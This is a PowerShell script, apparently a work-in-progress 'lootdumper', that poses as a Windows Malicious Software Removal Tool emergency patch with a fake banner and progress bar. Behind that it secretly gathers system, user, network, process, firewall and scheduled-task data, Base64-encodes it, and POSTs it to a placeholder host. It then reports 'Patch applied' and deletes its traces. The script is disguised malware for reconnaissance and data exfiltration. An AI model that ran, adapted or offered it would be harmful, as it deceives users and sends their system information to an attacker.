#lootdumper wip

# Clean local dump + Base64 encoder

#Windows Malicious Software Removal Tool 64-bit, lol

Clear-Host

# --- ASCII banner ---
$banner = @'
+============================================================================+
|                                                                            |
|        WINDOWS MALICIOUS SOFTWARE REMOVAL TOOL (64-bit)                    |
|        Emergency Patch: AM_Delta_Patch_1.393.1021.0                        |
|                                                                            |
|        /!\  Please stand by — do not shut down the computer.               |
|                                                                            |
+============================================================================+
'@

Write-Host $banner -ForegroundColor Cyan

# --- Progress bar simulation ---
$barLength = 40        # width of the progress bar
$totalSteps = 100      # total percent
for ($i = 0; $i -le $totalSteps; $i++) {
    $filled = [math]::Round(($i / $totalSteps) * $barLength)
    $empty  = $barLength - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    Write-Host -NoNewline "`r[$bar] $i% "
    Start-Sleep -Milliseconds 80
}

Write-Host "`n`nPatch loading complete.`n" -ForegroundColor Green
Write-Host "`n`nPatch is being applied.`n" -ForegroundColor Yellow



# Unique ID for this dump
$uuid = (Get-CimInstance -ClassName Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
if (-not $uuid) { $uuid = [guid]::NewGuid().Guid }
$timestamp = Get-Date -Format "yyyyMMddHHmm"
$dumpId = "$($uuid)_$timestamp"

# Prepare temp folder
$tempPath = Join-Path -Path $env:TEMP -ChildPath "sysdump_$dumpId"
New-Item -Path $tempPath -ItemType Directory -Force | Out-Null

# Collect data (use best-available cmdlets, fallback to command-line where appropriate)
$data = [ordered]@{
    DumpId      = $dumpId
    CollectedOn = (Get-Date).ToString("o")
    Computer    = @{
        Hostname = $env:COMPUTERNAME
        Domain   = $env:USERDOMAIN
        OS       = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue) |
                    Select-Object Caption,Version,BuildNumber,OSArchitecture,SerialNumber
}

}
# Installed products (Win32_Product can be slow and has side effects; attempt but tolerate failure)
try {
    $data.InstalledProducts = Get-CimInstance -ClassName Win32_Product -ErrorAction Stop |
                              Select-Object Name,Vendor,Version,Caption
} catch {
    $data.InstalledProducts = "Skipped or unavailable: Win32_Product is slow and may have side effects. Use package manager queries as needed."
}

# Services
try {
    $data.Services = Get-CimInstance -ClassName Win32_Service -ErrorAction Stop |
                     Select-Object Name,DisplayName,State,StartMode,PathName,StartName
} catch {
    $data.Services = "Unable to enumerate Win32_Service: $($_.Exception.Message)"
}

# Local users / groups (prefer modern cmdlets when available)
try {
        $data.LocalUsers = Get-LocalUser | Select-Object Name,Enabled,LastLogon
        $data.LocalAdmins = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue |
                            Select-Object @{n='Account';e={$_.Name}},ObjectClass
} catch {
    $data.LocalUsers = "Unable to list local users/groups: $($_.Exception.Message)"
}

# Network info (text capture)
$data.Network = @{
    IPConfig = ipconfig /all
    ARP      = arp -a
    Netstat  = netstat -anob
    Routes   = route print
}

try {
    $data.Processes = Get-Process -ErrorAction Stop | Select-Object Name,Id,Path,CPU,StartTime -ErrorAction SilentlyContinue
} catch {
    $data.Processes = "Unable to enumerate processes in detail: $($_.Exception.Message)"
}


# Additional files (tasklist/text)
$data.TaskMgrList = @{
TasklistVerbose = tasklist /V
TasklistModules = tasklist /M
TasklistSvc = tasklist /SVC
}

# Additional files (tasklist/text)
$data.Other = @{
Qwinsta = qwinsta
FireWall = netsh firewall show state
FireWallConfig = netsh firewall show config
FireWallRules = netsh advfirewall firewall show rule name=all verbose
Tasks = schtasks /query /fo LIST /v
Drivers = driverquery /v
}


# Save JSON
$jsonPath = Join-Path $tempPath "sysdump_$dumpId.json"
try {
    $data | ConvertTo-Json -Depth 6 | Out-File -FilePath $jsonPath -Encoding UTF8
} catch {
    # Fallback: attempt smaller depth
    $data | ConvertTo-Json -Depth 3 | Out-File -FilePath $jsonPath -Encoding UTF8
}

# Create Base64 encoded version of the JSON
try {
    # Read JSON content as bytes
    $jsonContent = Get-Content -Path $jsonPath -Raw -ErrorAction Stop
    $jsonBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonContent)

    # Base64 encode
    $b64 = [Convert]::ToBase64String($jsonBytes)

    # Build and normalize the destination path (removes duplicate slashes)
    $b64Path = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($tempPath, "sysdump_$dumpId.b64"))

    # Ensure destination folder exists (defensive)
    $destFolder = [System.IO.Path]::GetDirectoryName($b64Path)
    if (-not (Test-Path -LiteralPath $destFolder)) {
        New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
    }

    # Write Base64 to file
    $b64 | Out-File -FilePath $b64Path -Encoding ascii -Force
} catch {
    Write-Warning "Failed to create Base64 file: $($_.Exception.Message)"
}

#Invoke-WebRequest -Uri https://example.com -Method POST -Body $b64
#$ProgressPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; $null = Invoke-WebRequest -Uri 'https://example.com/' -Method POST -Body $b64 -ErrorAction SilentlyContinue
try {
    $r = Invoke-WebRequest -Uri 'https://example.com/' -Method POST -Body $b64 -ErrorAction Stop
    if ($r.StatusCode -eq 200) { 'Patch applied' }
}
catch {
    # nothing printed; remove or log if you need diagnostics
}


Remove-Item -Recurse -Force $tempPath